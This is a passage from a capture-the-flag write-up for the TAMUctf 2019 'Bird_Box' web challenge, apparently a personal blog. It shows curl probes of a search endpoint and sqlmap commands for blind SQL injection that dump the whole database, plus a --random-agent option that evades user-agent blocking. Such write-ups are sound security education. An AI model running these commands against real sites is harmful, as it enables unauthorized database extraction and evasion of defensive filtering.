```
So there are three items in the table: Aggies, Eggs and Trucks.
Searching for them indeed returns a response, instead of the regular error 500:
```console
root@kali:/media/sf_CTFs/tamu/Bird_Box# curl web2.tamuctf.com/Search.php?Search=Aggies
Aggiesroot@kali:/media/sf_CTFs/tamu/Bird_Box# curl web2.tamuctf.com/Search.php?Search=Eggs
Eggsroot@kali:/media/sf_CTFs/tamu/Bird_Box# curl web2.tamuctf.com/Search.php?Search=Trucks
Trucks
```
I tried searching the images for some stego clues, with no success.
At last, I went back to the description, looking for clues:
> We've got Aggies, Trucks, and Eggs!
Well, it turns out that the path to Aggies, Trucks and Eggs should have been much shorter than the one I took. The answer must be hiding elsewhere.
With not much left to work with, I tried to dump the complete DB:
```console
root@kali:/media/sf_CTFs/tamu/Bird_Box# sqlmap -u "http://localhost:8000/?*" --dbms=MySQL --technique=B  --all

## Update
From reading another writeup ([link](https://medium.com/@noobintheshell/tamuctf2019-writeups-1-360f53008f7a)) it turns out that the reason SQLMap failed is because the SQLMap user agent was being blocked. This explains why the proxy resolved the issue.
The easy way to bypass this was using the `--random-agent` option:
```console
root@kali:/media/sf_CTFs/tamu/# sqlmap -u http://web2.tamuctf.com/Search.php?Search=1 --random-agent  --dbms=MySQL --technique=B --level 5 --risk 3
